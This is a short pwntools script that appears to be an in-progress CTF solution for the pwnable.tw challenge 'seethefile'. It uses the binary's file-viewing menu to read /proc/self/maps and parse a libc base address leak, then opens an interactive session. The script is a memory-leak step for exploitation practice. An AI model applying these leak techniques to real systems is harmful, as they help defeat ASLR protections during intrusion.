#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3
from pwn import *

context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10200
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    return e.process()

def GDB(p):
    script = '''
    '''
    gdb.attach(p, gdbscript=script)

# OFFSET & VARIABLES
# FUNCTIONS
def open_file(p, file_name):
    p.sendlineafter(b"Your choice :", B(1))
    p.sendlineafter(b"What do you want to see :", B(file_name))

def read_file(p):
    p.sendlineafter(b"Your choice :", B(2))

def write_to_screen(p):
    p.sendlineafter(b"Your choice :", B(3))    

# MAIN
def main():
    p = connect()

    open_file(p, "/proc/self/maps")

    read_file(p)
    read_file(p)

    write_to_screen(p)

    p.recvline()
    
    LEAK_LIBC = int("0x" + p.recvline()[0:8].decode(), 16)

    print(f"LIBC BASE -> {hex(LEAK_LIBC)}")

    
    
    p.interactive()

if __name__ == '__main__':
    main()
